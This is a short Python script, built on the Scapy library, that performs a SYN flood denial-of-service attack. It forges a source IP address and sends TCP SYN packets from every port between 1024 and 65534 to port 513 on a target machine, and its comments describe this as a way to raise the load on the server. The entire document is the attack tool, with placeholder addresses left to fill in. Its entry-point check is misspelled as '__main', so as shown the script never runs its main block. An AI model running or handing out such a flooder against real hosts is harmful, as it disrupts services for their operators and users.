from scapy.all import send
from scapy.layers.inet import IP, TCP

def synflood(src, trgt):
    for sport in range(1024, 65535):
    # We can cycle through destination ports as well but here we will take 1 port from destination to increase load on the server.
        ip_segment = IP(src=src, dst=trgt)
        tcp_segment = TCP(sport=sport, dport=513, flags="S") #taking only 1 destination port : 513 here
        syn_pkt = ip_segment / tcp_segment
        send(syn_pkt)

if __name__ == '__main':
    src = 'yyy.yyy.yyy.yyy'     #Replace with the source IPv4 address.
    trgt = 'zzz.zzz.zzz.zzz'    #Replace with the target IPv4 address.
    synflood(src, trgt)
